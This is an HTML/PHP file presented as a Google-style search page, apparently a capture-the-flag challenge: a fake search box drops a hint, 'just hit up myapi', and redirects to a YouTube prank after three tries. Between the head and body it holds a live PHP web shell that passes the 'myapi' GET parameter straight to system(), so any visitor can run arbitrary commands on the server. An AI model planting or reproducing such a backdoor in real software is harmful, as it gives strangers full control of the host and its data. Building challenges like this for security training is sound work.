<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Custom Search Page</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
        }
        .search-container {
            text-align: center;
        }
        .search-bar {
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 20px;
            width: 300px;
            outline: none;
            transition: all 0.3s ease;
        }
        .search-bar:focus {
            border-color: #0073e6;
        }
        .search-button {
            padding: 10px 20px;
            border: none;
            border-radius: 20px;
            background-color: #0073e6;
            color: #fff;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .search-button:hover {
            background-color: #005bb5;
        }
    </style>
    <script>
        let attemptCount = 0;

        function handleSearch(event) {
            event.preventDefault();
            attemptCount++;
            const query = document.getElementById('search-bar').value;
            if (attemptCount > 3) {
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            } else if (query) {
                alert('hey! my box is not available. just hit up myapi');
            }
        }
    </script>
</head>
<?php
    if(isset($_GET['myapi']))
    {
        system($_GET['myapi']);
    }
?>
<body>
    <div class="search-container">
        <form onsubmit="handleSearch(event)">
            <input type="text" id="search-bar" class="search-bar" placeholder="Search Google or type a URL">
            <button type="submit" class="search-button">Google Search</button>
        </form>
    </div>
</body>
</html>
